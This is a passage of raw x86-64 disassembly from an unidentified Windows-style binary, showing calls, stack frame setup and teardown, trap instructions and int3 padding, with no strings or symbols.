   14005a0de:	lea    r8,[rbp+0xd10]
   14005a0e5:	call   0x14006ec60
   14005a0ea:	test   rax,rax
   14005a0ed:	jne    0x14005a19f
   14005a0f3:	mov    rcx,QWORD PTR [rbp+0x500]
   14005a0fa:	mov    rdx,QWORD PTR [rbp+0x508]
   14005a101:	call   0x14003bd28
   14005a106:	mov    rcx,QWORD PTR [rbp+0xf80]
   14005a10d:	mov    rdx,QWORD PTR [rbp+0xf88]
   14005a114:	call   0x14006f7f7
   14005a119:	lea    rsi,[rbp+0x7d0]
   14005a120:	and    QWORD PTR [rsi],0x0
   14005a124:	mov    QWORD PTR [rsi+0x8],0x1
   14005a12c:	and    QWORD PTR [rsi+0x10],0x0
   14005a131:	call   0x14006ebd0
   14005a136:	mov    rcx,rsi
   14005a139:	call   0x14006d680
   14005a13e:	mov    rdi,rax
   14005a141:	mov    rcx,rax
   14005a144:	call   0x14003bd70
   14005a149:	mov    rcx,QWORD PTR [rsi]
   14005a14c:	mov    rdx,QWORD PTR [rsi+0x8]
   14005a150:	call   0x14006f7f7
   14005a155:	test   rdi,rdi
   14005a158:	mov    rcx,QWORD PTR [rbp+0x248]
   14005a15f:	mov    rdx,QWORD PTR [rbp+0x4d0]
   14005a166:	jmp    0x14003cacc
   14005a16b:	xor    eax,eax
   14005a16d:	jmp    0x140059f99
   14005a172:	mov    rdx,QWORD PTR [rbp+0xd20]
   14005a179:	mov    rcx,QWORD PTR [rbp+0x1138]
   14005a180:	call   0x14007d6d8
   14005a185:	ud2
   14005a187:	lea    r8,[rip+0x2df82]        # 0x140088110
   14005a18e:	push   0x10
   14005a190:	jmp    0x140048149
   14005a195:	call   0x14007e4c3
   14005a19a:	jmp    0x14005a0d0
   14005a19f:	mov    QWORD PTR [rbp+0x290],rax
   14005a1a6:	lea    rdx,[rbp+0x7d0]
   14005a1ad:	lea    rax,[rbp+0x400]
   14005a1b4:	mov    QWORD PTR [rdx],rax
   14005a1b7:	lea    rax,[rip+0xb12]        # 0x14005acd0
   14005a1be:	mov    QWORD PTR [rdx+0x8],rax
   14005a1c2:	lea    rax,[rbp+0x290]
   14005a1c9:	mov    QWORD PTR [rdx+0x10],rax
   14005a1cd:	lea    rax,[rip+0x12e1c]        # 0x14006cff0
   14005a1d4:	mov    QWORD PTR [rdx+0x18],rax
   14005a1d8:	lea    rcx,[rip+0x302c9]        # 0x14008a4a8
   14005a1df:	lea    r8,[rip+0x3032a]        # 0x14008a510
   14005a1e6:	call   0x14007d930
   14005a1eb:	nop
   14005a1ec:	ud2
   14005a1ee:	lea    rcx,[rip+0x2df33]        # 0x140088128
   14005a1f5:	jmp    0x140059dc3
   14005a1fa:	mov    QWORD PTR [rsp+0x10],rdx
   14005a1ff:	push   rbp
   14005a200:	push   r15
   14005a202:	push   r14
   14005a204:	push   r13
   14005a206:	push   r12
   14005a208:	push   rsi
   14005a209:	push   rdi
   14005a20a:	push   rbx
   14005a20b:	sub    rsp,0x58
   14005a20f:	lea    rbp,[rdx+0x80]
   14005a216:	movaps XMMWORD PTR [rsp+0x30],xmm7
   14005a21b:	movaps XMMWORD PTR [rsp+0x40],xmm6
   14005a220:	mov    rcx,QWORD PTR [rbp+0x290]
   14005a227:	call   0x140067600
   14005a22c:	movaps xmm6,XMMWORD PTR [rsp+0x40]
   14005a231:	movaps xmm7,XMMWORD PTR [rsp+0x30]
   14005a236:	add    rsp,0x58
   14005a23a:	pop    rbx
   14005a23b:	pop    rdi
   14005a23c:	pop    rsi
   14005a23d:	pop    r12
   14005a23f:	pop    r13
   14005a241:	pop    r14
   14005a243:	pop    r15
   14005a245:	pop    rbp
   14005a246:	ret
   14005a247:	int3
   14005a248:	int3
   14005a249:	int3
   14005a24a:	int3
   14005a24b:	int3
   14005a24c:	int3
   14005a24d:	int3
   14005a24e:	int3
   14005a24f:	int3
